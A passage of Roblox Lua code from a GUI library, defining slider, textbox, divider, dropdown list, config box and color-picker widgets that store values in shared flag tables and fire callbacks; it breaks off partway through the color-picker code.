                bg.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
                bg.BorderColor3 = Color3.fromRGB(0, 0, 0)
                bg.BorderSizePixel = 2
                bg.Position = UDim2.new(0.02, -1, 0, 16)
                bg.Size = UDim2.new(0, 205, 0, 10)
                
                main.Name = "main"
                main.Parent = bg
                main.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
                main.BorderColor3 = Color3.fromRGB(50, 50, 50)
                main.Size = UDim2.new(1, 0, 1, 0)
                
                fill.Name = "fill"
                fill.Parent = main
                fill.BackgroundColor3 = library.libColor
                fill.BackgroundTransparency = 0.200
                fill.BorderColor3 = Color3.fromRGB(60, 60, 60)
                fill.BorderSizePixel = 0
                fill.Size = UDim2.new(0.617238641, 13, 1, 0)
                
                button.Name = "button"
                button.Parent = main
                button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                button.BackgroundTransparency = 1.000
                button.Size = UDim2.new(0, 191, 1, 0)
                button.Font = Enum.Font.SourceSans
                button.Text = ""
                button.TextColor3 = Color3.fromRGB(0, 0, 0)
                button.TextSize = 14.000
                
                valuetext.Parent = main
                valuetext.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                valuetext.BackgroundTransparency = 1.000
                valuetext.Position = UDim2.new(0.5, 0, 0.5, 0)
                valuetext.Font = Enum.Font.Code
                valuetext.Text = "0.9172/10"
                valuetext.TextColor3 = Color3.fromRGB(255, 255, 255)
                valuetext.TextSize = 14.000
                valuetext.TextStrokeTransparency = 0.000
                
                UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(105, 105, 105)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(121, 121, 121))}
                UIGradient.Rotation = 90
                UIGradient.Parent = main
                
                text.Name = "text"
                text.Parent = slider
                text.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                text.BackgroundTransparency = 1.000
                text.Position = UDim2.new(0.0299999993, -1, 0, 7)
                text.ZIndex = 2
                text.Font = Enum.Font.Code
                text.Text = args.text or args.flag
                text.TextColor3 = Color3.fromRGB(244, 244, 244)
                text.TextSize = 13.000
                text.TextStrokeTransparency = 0.000
                text.TextXAlignment = Enum.TextXAlignment.Left

                local entered = false
                local scrolling = false
                local amount = 0

                local function roundToDecimals(value, decimals)
                    local mult = 10^decimals
                    return math.round(value * mult) / mult
                end
                
                local function updateValue(value)
                    if library.colorpicking then return end
                
                    local rounding = args.Rounding or 0 
                    value = roundToDecimals(value, rounding) 
                
                    local sizeX = math.clamp(value / args.max, 0, 1) 
                    fill:TweenSize(UDim2.new(sizeX, 0, 1, 0), Enum.EasingDirection.In, Enum.EasingStyle.Sine, 0.01)
                
                    valuetext.Text = string.format("%." .. rounding .. "f", value) .. (sub or "") 
                    library.flags[args.flag] = value
                
                    if args.callback then
                        args.callback(value)
                    end
                end
                
                local function updateScroll()
                    if scrolling or library.scrolling or not newTab.Visible or library.colorpicking then return end
                    while inputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) and menu.Enabled do
                        runService.RenderStepped:Wait()
                        library.scrolling = true
                        valuetext.TextColor3 = Color3.fromRGB(255, 255, 255)
                        scrolling = true
                        local relativeX = (mouse.X - button.AbsolutePosition.X) / button.AbsoluteSize.X
                        local value = args.min + relativeX * (args.max - args.min)
                
                        value = math.clamp(value, args.min, args.max)
                        updateValue(value)
                    end
                    scrolling = false
                    library.scrolling = false
                end

                button.MouseEnter:connect(function()
                    if library.colorpicking then return end
                    if scrolling or entered then return end
                    entered = true
                    main.BorderColor3 = library.libColor
                    while entered do wait()
                        updateScroll()
                    end
                end)

                button.MouseLeave:connect(function()
                    entered = false
                    main.BorderColor3 = Color3.fromRGB(60, 60, 60)
                end)

                if args.value then
                    updateValue(args.value)
                end

                library.flags[args.flag] = 0
                library.options[args.flag] = {type = "slider",changeState = updateValue,skipflag = args.skipflag,oldargs = args}
                updateValue(args.value or 0)
            end
            function group:addTextbox(args)
                if not args.flag then return warn("⚠️ incorrect arguments ⚠️") end
                groupbox.Size += UDim2.new(0, 0, 0, 35)

                local textbox = Instance.new("Frame")
                local bg = Instance.new("Frame")
                local main = Instance.new("ScrollingFrame")
                local box = Instance.new("TextBox")
                local gradient = Instance.new("UIGradient")
                local text = Instance.new("TextLabel")

                box:GetPropertyChangedSignal('Text'):Connect(function(val)
                    if library.colorpicking then return end
                    library.flags[args.flag] = box.Text
                    args.value = box.Text
                    if args.callback then
                        args.callback()
                    end
                end)
                textbox.Name = "textbox"
                textbox.Parent = grouper
                textbox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                textbox.BackgroundTransparency = 1.000
                textbox.BorderSizePixel = 0
                textbox.Size = UDim2.new(1, 0, 0, 35)
                textbox.ZIndex = 10

                bg.Name = "bg"
                bg.Parent = textbox
                bg.BackgroundColor3 = Color3.fromRGB(15,15,15)
                bg.BorderColor3 = Color3.fromRGB(0, 0, 0)
                bg.BorderSizePixel = 2
                bg.Position = UDim2.new(0.02, -1, 0, 16)
                bg.Size = UDim2.new(0, 205, 0, 15)

                main.Name = "main"
                main.Parent = bg
                main.Active = true
                main.BackgroundColor3 = Color3.fromRGB(15,15,15)
                main.BorderColor3 = Color3.fromRGB(30, 30, 30)
                main.Size = UDim2.new(1, 0, 1, 0)
                main.CanvasSize = UDim2.new(0, 0, 0, 0)
                main.ScrollBarThickness = 0

                box.Name = "box"
                box.Parent = main
                box.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                box.BackgroundTransparency = 1.000
                box.Selectable = false
                box.Size = UDim2.new(1, 0, 1, 0)
                box.Font = Enum.Font.Code
                box.Text = args.value or ""
                box.TextColor3 = Color3.fromRGB(255, 255, 255)
                box.TextSize = 13.000
                box.TextStrokeTransparency = 0.000
                box.TextXAlignment = Enum.TextXAlignment.Left

                gradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(105, 105, 105)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(121, 121, 121))}
                gradient.Rotation = 90
                gradient.Name = "gradient"
                gradient.Parent = main

                text.Name = "text"
                text.Parent = textbox
                text.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                text.BackgroundTransparency = 1.000
                text.Position = UDim2.new(0.0299999993, -1, 0, 7)
                text.ZIndex = 2
                text.Font = Enum.Font.Code
                text.Text = args.text or args.flag
                text.TextColor3 = Color3.fromRGB(244, 244, 244)
                text.TextSize = 13.000
                text.TextStrokeTransparency = 0.000
                text.TextXAlignment = Enum.TextXAlignment.Left


                library.flags[args.flag] = args.value or ""
                library.options[args.flag] = {type = "textbox",changeState = function(text) box.Text = text end,skipflag = args.skipflag,oldargs = args}
            end
            function group:addDivider(args)
                groupbox.Size += UDim2.new(0, 0, 0, 10)
                
                local div = Instance.new("Frame")
                local bg = Instance.new("Frame")
                local main = Instance.new("Frame")

                div.Name = "div"
                div.Parent = grouper
                div.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                div.BackgroundTransparency = 1.000
                div.BorderSizePixel = 0
                div.Position = UDim2.new(0, 0, 0.743662, 0)
                div.Size = UDim2.new(0, 202, 0, 10)
                
                bg.Name = "bg"
                bg.Parent = div
                bg.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
                bg.BorderColor3 = Color3.fromRGB(0, 0, 0)
                bg.BorderSizePixel = 2
                bg.Position = UDim2.new(0.02, 0, 0, 4)
                bg.Size = UDim2.new(0, 191, 0, 1)
                
                main.Name = "main"
                main.Parent = bg
                main.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
                main.BorderColor3 = Color3.fromRGB(60, 60, 60)
                main.Size = UDim2.new(0, 191, 0, 1)
            end
            function group:addList(args)
                if not args.flag or not args.values then return warn("⚠️ incorrect arguments ⚠️") end
                groupbox.Size += UDim2.new(0, 0, 0, 35)
                
                library.multiZindex -= 1
    
                local list = Instance.new("Frame")
                local bg = Instance.new("Frame")
                local main = Instance.new("ScrollingFrame")
                local button = Instance.new("TextButton")
                local dumbtriangle = Instance.new("ImageLabel")
                local valuetext = Instance.new("TextLabel")
                local gradient = Instance.new("UIGradient")
                local text = Instance.new("TextLabel")
    
                local frame = Instance.new("Frame")
                local holder = Instance.new("Frame")
                local UIListLayout = Instance.new("UIListLayout")
                
                list.Name = "list"
                list.Parent = grouper
                list.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                list.BackgroundTransparency = 1.000
                list.BorderSizePixel = 0
                list.Size = UDim2.new(1, 0, 0, 35)
                list.ZIndex = library.multiZindex
    
                bg.Name = "bg"
                bg.Parent = list
                bg.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
                bg.BorderColor3 = Color3.fromRGB(0, 0, 0)
                bg.BorderSizePixel = 2
                bg.Position = UDim2.new(0.02, -1, 0, 16)
                bg.Size = UDim2.new(0, 205, 0, 15)
    
                main.Name = "main"
                main.Parent = bg
                main.Active = true
                main.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
                main.BorderColor3 = Color3.fromRGB(60, 60, 60)
                main.Size = UDim2.new(1, 0, 1, 0)
                main.CanvasSize = UDim2.new(0, 0, 0, 0)
                main.ScrollBarThickness = 0
    
                button.Name = "button"
                button.Parent = main
                button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                button.BackgroundTransparency = 1.000
                button.Size = UDim2.new(0, 191, 1, 0)
                button.Font = Enum.Font.SourceSans
                button.Text = ""
                button.TextColor3 = Color3.fromRGB(0, 0, 0)
                button.TextSize = 14.000
    
                dumbtriangle.Name = "dumbtriangle"
                dumbtriangle.Parent = main
                dumbtriangle.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                dumbtriangle.BackgroundTransparency = 1.000
                dumbtriangle.BorderColor3 = Color3.fromRGB(0, 0, 0)
                dumbtriangle.BorderSizePixel = 0
                dumbtriangle.Position = UDim2.new(1, -11, 0.5, -3)
                dumbtriangle.Size = UDim2.new(0, 7, 0, 6)
                dumbtriangle.ZIndex = 3
                dumbtriangle.Image = "rbxassetid://8532000591"
    
                valuetext.Name = "valuetext"
                valuetext.Parent = main
                valuetext.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                valuetext.BackgroundTransparency = 1.000
                valuetext.Position = UDim2.new(0.00200000009, 2, 0, 7)
                valuetext.ZIndex = 2
                valuetext.Font = Enum.Font.Code
                valuetext.Text = ""
                valuetext.TextColor3 = Color3.fromRGB(244, 244, 244)
                valuetext.TextSize = 13.000
                valuetext.TextStrokeTransparency = 0.000
                valuetext.TextXAlignment = Enum.TextXAlignment.Left
    
                gradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(105, 105, 105)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(121, 121, 121))}
                gradient.Rotation = 90
                gradient.Name = "gradient"
                gradient.Parent = main
    
                text.Name = "text"
                text.Parent = list
                text.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                text.BackgroundTransparency = 1.000
                text.Position = UDim2.new(0.0299999993, -1, 0, 7)
                text.ZIndex = 2
                text.Font = Enum.Font.Code
                text.Text = args.text or args.flag
                text.TextColor3 = Color3.fromRGB(244, 244, 244)
                text.TextSize = 13.000
                text.TextStrokeTransparency = 0.000
                text.TextXAlignment = Enum.TextXAlignment.Left
    
                frame.Name = "frame"
                frame.Parent = list
                frame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
                frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
                frame.BorderSizePixel = 2
                frame.Position = UDim2.new(0.0299999993, -1, 0.605000019, 15)
                frame.Size = UDim2.new(0, 203, 0, 0)
                frame.Visible = false
                frame.ZIndex = library.multiZindex
                
                holder.Name = "holder"
                holder.Parent = frame
                holder.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
                holder.BorderColor3 = Color3.fromRGB(60, 60, 60)
                holder.Size = UDim2.new(1, 0, 1, 0)
                
                UIListLayout.Parent = holder
                UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
    
                local function updateValue(value)
                    if value == nil then valuetext.Text = "nil" return end
                    if args.multiselect then
                        if type(value) == "string" then
                            if not table.find(library.options[args.flag].values,value) then return end
                            if table.find(library.flags[args.flag],value) then
                                for i,v in pairs(library.flags[args.flag]) do
                                    if v == value then
                                        table.remove(library.flags[args.flag],i)
                                    end
                                end
                            else
                                table.insert(library.flags[args.flag],value)
                            end
                        else
                            library.flags[args.flag] = value
                        end
                        local buttonText = ""
                        for i,v in pairs(library.flags[args.flag]) do
                            local jig = i ~= #library.flags[args.flag] and "," or ""
                            buttonText = buttonText..v..jig
                        end
                        if buttonText == "" then buttonText = "..." end
                        for i,v in next, holder:GetChildren() do
                            if v.ClassName ~= "Frame" then continue end
                            v.off.TextColor3 = Color3.new(0.65,0.65,0.65)
                            for _i,_v in next, library.flags[args.flag] do
                                if v.Name == _v then
                                    v.off.TextColor3 = Color3.new(1,1,1)
                                end
                            end
                        end
                        valuetext.Text = buttonText
                        if args.callback then
                            args.callback(library.flags[args.flag])
                        end
                    else
                        if not table.find(library.options[args.flag].values,value) then value = library.options[args.flag].values[1] end
                        library.flags[args.flag] = value
                        for i,v in next, holder:GetChildren() do
                            if v.ClassName ~= "Frame" then continue end
                            v.off.TextColor3 = Color3.new(0.65,0.65,0.65)
                            if v.Name == library.flags[args.flag] then
                                v.off.TextColor3 = Color3.new(1,1,1)
                            end
                        end
                        frame.Visible = false
                        if library.flags[args.flag] then
                            valuetext.Text = library.flags[args.flag]
                            if args.callback then
                                args.callback(library.flags[args.flag])
                            end
                        end
                    end
                end
    
                function refresh(tbl)
                    for i,v in next, holder:GetChildren() do
                        if v.ClassName == "Frame" then
                            v:Destroy()
                        end
                        frame.Size = UDim2.new(0, 203, 0, 0)
                    end
                    for i,v in pairs(tbl) do
                        frame.Size += UDim2.new(0, 0, 0, 20)
    
                        local option = Instance.new("Frame")
                        local button_2 = Instance.new("TextButton")
                        local text_2 = Instance.new("TextLabel")
    
                        option.Name = v
                        option.Parent = holder
                        option.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                        option.BackgroundTransparency = 1.000
                        option.Size = UDim2.new(1, 0, 0, 20)
    
                        button_2.Name = "button"
                        button_2.Parent = option
                        button_2.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
                        button_2.BackgroundTransparency = 0.850
                        button_2.BorderSizePixel = 0
                        button_2.Size = UDim2.new(1, 0, 1, 0)
                        button_2.Font = Enum.Font.SourceSans
                        button_2.Text = ""
                        button_2.TextColor3 = Color3.fromRGB(0, 0, 0)
                        button_2.TextSize = 14.000
    
                        text_2.Name = "off"
                        text_2.Parent = option
                        text_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                        text_2.BackgroundTransparency = 1.000
                        text_2.Position = UDim2.new(0, 4, 0, 0)
                        text_2.Size = UDim2.new(0, 0, 1, 0)
                        text_2.Font = Enum.Font.Code
                        text_2.Text = v
                        text_2.TextColor3 = args.multiselect and Color3.new(0.65,0.65,0.65) or Color3.new(1,1,1)
                        text_2.TextSize = 14.000
                        text_2.TextStrokeTransparency = 0.000
                        text_2.TextXAlignment = Enum.TextXAlignment.Left
        
                        button_2.MouseButton1Click:Connect(function()
                            updateValue(v)
                        end)
                    end
                    library.options[args.flag].values = tbl
                    updateValue(table.find(library.options[args.flag].values,library.flags[args.flag]) and library.flags[args.flag] or library.options[args.flag].values[1])
                end
    
                button.MouseButton1Click:Connect(function()
                    if not library.colorpicking then
                        frame.Visible = not frame.Visible
                    end
                end)
                button.MouseEnter:connect(function()
                    main.BorderColor3 = library.libColor
                end)
                button.MouseLeave:connect(function()
                    main.BorderColor3 = Color3.fromRGB(60, 60, 60)
                end)
                
                table.insert(library.toInvis,frame)
                library.flags[args.flag] = args.multiselect and {} or ""
                library.options[args.flag] = {type = "list",changeState = updateValue,values = args.values,refresh = refresh,skipflag = args.skipflag,oldargs = args}
    
                refresh(args.values)
                updateValue(args.value or not args.multiselect and args.values[1] or "abcdefghijklmnopqrstuwvxyz")
            end
            function group:addConfigbox(args)
                if not args.flag or not args.values then return warn("⚠️ incorrect arguments ⚠️") end
                groupbox.Size += UDim2.new(0, 0, 0, 138)
                library.multiZindex -= 1
                
                local list2 = Instance.new("Frame")
                local frame = Instance.new("Frame")
                local main = Instance.new("Frame")
                local holder = Instance.new("ScrollingFrame")
                local UIListLayout = Instance.new("UIListLayout")
                local dwn = Instance.new("ImageLabel")
                local up = Instance.new("ImageLabel")
            
                list2.Name = "list2"
                list2.Parent = grouper
                list2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                list2.BackgroundTransparency = 1.000
                list2.BorderSizePixel = 0
                list2.Position = UDim2.new(0, 0, 0.108108111, 0)
                list2.Size = UDim2.new(1, 0, 0, 138)
                
                frame.Name = "frame"
                frame.Parent = list2
                frame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
                frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
                frame.BorderSizePixel = 2
                frame.Position = UDim2.new(0.02, -1, 0.0439999998, 0)
                frame.Size = UDim2.new(0, 205, 0, 128)
                
                main.Name = "main"
                main.Parent = frame
                main.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
                main.BorderColor3 = Color3.fromRGB(30,30,30)
                main.Size = UDim2.new(1, 0, 1, 0)
                
                holder.Name = "holder"
                holder.Parent = main
                holder.Active = true
                holder.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                holder.BackgroundTransparency = 1.000
                holder.BorderSizePixel = 0
                holder.Position = UDim2.new(0, 0, 0.00571428565, 0)
                holder.Size = UDim2.new(1, 0, 1, 0)
                holder.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
                holder.CanvasSize = UDim2.new(0, 0, 0, 0)
                holder.ScrollBarThickness = 0
                holder.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
                holder.AutomaticCanvasSize = Enum.AutomaticSize.Y
                holder.ScrollingEnabled = true
                holder.ScrollBarImageTransparency = 0
                
                UIListLayout.Parent = holder
                
                dwn.Name = "dwn"
                dwn.Parent = frame
                dwn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                dwn.BackgroundTransparency = 1.000
                dwn.BorderColor3 = Color3.fromRGB(0, 0, 0)
                dwn.BorderSizePixel = 0
                dwn.Position = UDim2.new(0.930000007, 4, 1, -9)
                dwn.Size = UDim2.new(0, 7, 0, 6)
                dwn.ZIndex = 3
                dwn.Image = "rbxassetid://8548723563"
                dwn.Visible = false
                
                up.Name = "up"
                up.Parent = frame
                up.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                up.BackgroundTransparency = 1.000
                up.BorderColor3 = Color3.fromRGB(0, 0, 0)
                up.BorderSizePixel = 0
                up.Position = UDim2.new(0, 3, 0, 3)
                up.Size = UDim2.new(0, 7, 0, 6)
                up.ZIndex = 3
                up.Image = "rbxassetid://8548757311"
                up.Visible = false

                local function updateValue(value)
                    if value == nil then return end
                    if not table.find(library.options[args.flag].values,value) then value = library.options[args.flag].values[1] end
                    library.flags[args.flag] = value
            
                    for i,v in next, holder:GetChildren() do
                        if v.ClassName ~= "Frame" then continue end
                        if v.text.Text == library.flags[args.flag] then
                            v.text.TextColor3 = library.libColor
                        else
                            v.text.TextColor3 = Color3.fromRGB(255,255,255)
                        end
                    end
                    if library.flags[args.flag] then
                        if args.callback then
                            args.callback(library.flags[args.flag])
                        end
                    end
                    holder.Visible = true
                end
                holder:GetPropertyChangedSignal("CanvasPosition"):Connect(function()
                    up.Visible = (holder.CanvasPosition.Y > 1)
                    dwn.Visible = (holder.CanvasPosition.Y + 1 < (holder.AbsoluteCanvasSize.Y - holder.AbsoluteSize.Y))
                end)
            
            
                function refresh(tbl)
                    for i,v in next, holder:GetChildren() do
                        if v.ClassName == "Frame" then
                            v:Destroy()
                        end
                    end
                    for i,v in pairs(tbl) do
                        local item = Instance.new("Frame")
                        local button = Instance.new("TextButton")
                        local text = Instance.new("TextLabel")
            
                        item.Name = v
                        item.Parent = holder
                        item.Active = true
                        item.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                        item.BackgroundTransparency = 1.000
                        item.BorderColor3 = Color3.fromRGB(0, 0, 0)
                        item.BorderSizePixel = 0
                        item.Size = UDim2.new(1, 0, 0, 18)
                        
                        button.Parent = item
                        button.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
                        button.BackgroundTransparency = 1
                        button.BorderColor3 = Color3.fromRGB(0, 0, 0)
                        button.BorderSizePixel = 0
                        button.Size = UDim2.new(1, 0, 1, 0)
                        button.Text = ""
                        button.TextTransparency = 1.000
                        
                        text.Name = 'text'
                        text.Parent = item
                        text.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                        text.BackgroundTransparency = 1.000
                        text.Size = UDim2.new(1, 0, 0, 18)
                        text.Font = Enum.Font.Code
                        text.Text = v
                        text.TextColor3 = Color3.fromRGB(255, 255, 255)
                        text.TextSize = 14.000
                        text.TextStrokeTransparency = 0.000
            
                        button.MouseButton1Click:Connect(function()
                            updateValue(v)
                        end)
                    end
            
                    holder.Visible = true
                    library.options[args.flag].values = tbl
                    updateValue(table.find(library.options[args.flag].values,library.flags[args.flag]) and library.flags[args.flag] or library.options[args.flag].values[1])
                end
            
            
                library.flags[args.flag] = ""
                library.options[args.flag] = {type = "cfg",changeState = updateValue,values = args.values,refresh = refresh,skipflag = args.skipflag,oldargs = args}
            
                refresh(args.values)
                updateValue(args.value or not args.multiselect and args.values[1] or "abcdefghijklmnopqrstuwvxyz")
            end
            function group:addColorpicker(args)
                if not args.flag then return warn("⚠️ incorrect arguments ⚠️") end
                groupbox.Size += UDim2.new(0, 0, 0, 20)
            
                library.multiZindex -= 1
                jigCount -= 1
                topStuff -= 1

                local colorpicker = Instance.new("Frame")
                local back = Instance.new("Frame")
                local mid = Instance.new("Frame")
                local front = Instance.new("Frame")
                local text = Instance.new("TextLabel")
                local colorpicker_2 = Instance.new("Frame")
                local button = Instance.new("TextButton")

                local colorFrame = Instance.new("Frame")
                local colorFrame_2 = Instance.new("Frame")
                local hueframe = Instance.new("Frame")
                local main = Instance.new("Frame")
                local hue = Instance.new("ImageLabel")
                local pickerframe = Instance.new("Frame")
                local main_2 = Instance.new("Frame")
                local picker = Instance.new("ImageLabel")
                local clr = Instance.new("Frame")
                local copy = Instance.new("TextButton")

                colorpicker.Name = "colorpicker"
                colorpicker.Parent = grouper
                colorpicker.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                colorpicker.BackgroundTransparency = 1.000
                colorpicker.BorderSizePixel = 0
                colorpicker.Size = UDim2.new(1, 0, 0, 20)
                colorpicker.ZIndex = topStuff

                text.Name = "text"
                text.Parent = colorpicker
                text.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                text.BackgroundTransparency = 1.000
                text.Position = UDim2.new(0.02, -1, 0, 10)
                text.Font = Enum.Font.Code
                text.Text = args.text or args.flag
                text.TextColor3 = Color3.fromRGB(244, 244, 244)
                text.TextSize = 13.000
                text.TextStrokeTransparency = 0.000
                text.TextXAlignment = Enum.TextXAlignment.Left

                button.Name = "button"
                button.Parent = colorpicker
                button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                button.BackgroundTransparency = 1.000
                button.BorderSizePixel = 0
                button.Size = UDim2.new(1, 0, 1, 0)
                button.Font = Enum.Font.SourceSans
                button.Text = ""
                button.TextColor3 = Color3.fromRGB(0, 0, 0)
                button.TextSize = 14.000

                colorpicker_2.Name = "colorpicker"
                colorpicker_2.Parent = colorpicker
                colorpicker_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                colorpicker_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
                colorpicker_2.BorderSizePixel = 3
                colorpicker_2.Position = UDim2.new(0.860000014, 4, 0.272000015, 0)
                colorpicker_2.Size = UDim2.new(0, 20, 0, 10)

                mid.Name = "mid"
                mid.Parent = colorpicker_2
                mid.BackgroundColor3 = Color3.fromRGB(69, 23, 255)
                mid.BorderColor3 = Color3.fromRGB(30,30,30)
                mid.BorderSizePixel = 2
                mid.Size = UDim2.new(1, 0, 1, 0)

                front.Name = "front"
                front.Parent = mid
                front.BackgroundColor3 = Color3.fromRGB(240, 142, 214)
                front.BorderColor3 = Color3.fromRGB(0, 0, 0)
                front.Size = UDim2.new(1, 0, 1, 0)

                button.Name = "button"
                button.Parent = colorpicker
                button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                button.BackgroundTransparency = 1.000
                button.Size = UDim2.new(0, 202, 0, 22)
                button.Font = Enum.Font.SourceSans
                button.Text = ""
                button.ZIndex = args.ontop and topStuff or jigCount
                button.TextColor3 = Color3.fromRGB(0, 0, 0)
                button.TextSize = 14.000

                colorFrame.Name = "colorFrame"
                colorFrame.Parent = colorpicker
                colorFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
                colorFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
                colorFrame.BorderSizePixel = 2
                colorFrame.Position = UDim2.new(0.101092957, 0, 0.75, 0)
                colorFrame.Size = UDim2.new(0, 137, 0, 128)

                colorFrame_2.Name = "colorFrame"
                colorFrame_2.Parent = colorFrame
                colorFrame_2.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
                colorFrame_2.BorderColor3 = Color3.fromRGB(60, 60, 60)
                colorFrame_2.Size = UDim2.new(1, 0, 1, 0)

                hueframe.Name = "hueframe"
                hueframe.Parent = colorFrame_2
                hueframe.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
                hueframe.BorderColor3 = Color3.fromRGB(60, 60, 60)
                hueframe.BorderSizePixel = 2
                hueframe.Position = UDim2.new(-0.0930000022, 18, -0.0599999987, 30)
                hueframe.Size = UDim2.new(0, 100, 0, 100)

                main.Name = "main"
                main.Parent = hueframe
                main.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
                main.BorderColor3 = Color3.fromRGB(0, 0, 0)
                main.Size = UDim2.new(0, 100, 0, 100)
                main.ZIndex = 6

                picker.Name = "picker"
                picker.Parent = main
                picker.BackgroundColor3 = Color3.fromRGB(232, 0, 255)
                picker.BorderColor3 = Color3.fromRGB(0, 0, 0)
                picker.BorderSizePixel = 0
                picker.Size = UDim2.new(0, 100, 0, 100)
                picker.ZIndex = 104
                picker.Image = "rbxassetid://2615689005"

                pickerframe.Name = "pickerframe"
                pickerframe.Parent = colorFrame
                pickerframe.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
                pickerframe.BorderColor3 = Color3.fromRGB(60, 60, 60)
                pickerframe.BorderSizePixel = 2
                pickerframe.Position = UDim2.new(0.711000025, 14, -0.0599999987, 30)
                pickerframe.Size = UDim2.new(0, 20, 0, 100)

                main_2.Name = "main"
                main_2.Parent = pickerframe
                main_2.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
                main_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
                main_2.Size = UDim2.new(0, 20, 0, 100)
                main_2.ZIndex = 6

                hue.Name = "hue"
                hue.Parent = main_2
                hue.BackgroundColor3 = Color3.fromRGB(255, 0, 178)
                hue.BorderColor3 = Color3.fromRGB(0, 0, 0)
                hue.BorderSizePixel = 0
                hue.Size = UDim2.new(0, 20, 0, 100)
                hue.ZIndex = 104
                hue.Image = "rbxassetid://2615692420"

                clr.Name = "clr"
                clr.Parent = colorFrame
                clr.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
                clr.BackgroundTransparency = 1.000
                clr.BorderColor3 = Color3.fromRGB(60, 60, 60)
                clr.BorderSizePixel = 2
                clr.Position = UDim2.new(0.0280000009, 0, 0, 2)
                clr.Size = UDim2.new(0, 129, 0, 14)
                clr.ZIndex = 5

                copy.Name = "copy"
                copy.Parent = clr
                copy.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
                copy.BackgroundTransparency = 1.000
                copy.BorderSizePixel = 0
                copy.Size = UDim2.new(0, 129, 0, 14)
                copy.ZIndex = 5
                copy.Font = Enum.Font.Code
                copy.Text = args.text or args.flag
                copy.TextColor3 = Color3.fromRGB(100, 100, 100)
                copy.TextSize = 14.000
                copy.TextStrokeTransparency = 0.000
                
                copy.MouseButton1Click:Connect(function()
                    colorFrame.Visible = false
                end)

                button.MouseButton1Click:Connect(function()
                    colorFrame.Visible = not colorFrame.Visible
                    mid.BorderColor3 = Color3.fromRGB(30,30,30)
                end)

                button.MouseEnter:connect(function()
                    mid.BorderColor3 = library.libColor
                end)
                button.MouseLeave:connect(function()
                    mid.BorderColor3 = Color3.fromRGB(30,30,30)
                end)

                local function updateValue(value,fakevalue)
                    if typeof(value) == "table" then value = fakevalue end
                    library.flags[args.flag] = value
                    front.BackgroundColor3 = value
                    if args.callback then
                        args.callback(value)
                    end
                end

                local white, black = Color3.new(1,1,1), Color3.new(0,0,0)
                local colors = {Color3.new(1,0,0),Color3.new(1,1,0),Color3.new(0,1,0),Color3.new(0,1,1),Color3.new(0,0,1),Color3.new(1,0,1),Color3.new(1,0,0)}
                local heartbeat = game:GetService("RunService").Heartbeat

                local pickerX,pickerY,hueY = 0,0,0
                local oldpercentX,oldpercentY = 0,0

                hue.MouseEnter:Connect(function()
                    local input = hue.InputBegan:connect(function(key)
                        if key.UserInputType == Enum.UserInputType.MouseButton1 then
                            while heartbeat:wait() and inputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) do
                                library.colorpicking = true
                                local percent = (hueY-hue.AbsolutePosition.Y-36)/hue.AbsoluteSize.Y
                                local num = math.max(1, math.min(7,math.floor(((percent*7+0.5)*100))/100))
                                local startC = colors[math.floor(num)]
                                local endC = colors[math.ceil(num)]
                                local color = white:lerp(picker.BackgroundColor3, oldpercentX):lerp(black, oldpercentY)
                                picker.BackgroundColor3 = startC:lerp(endC, num-math.floor(num)) or Color3.new(0, 0, 0)
                                updateValue(color)
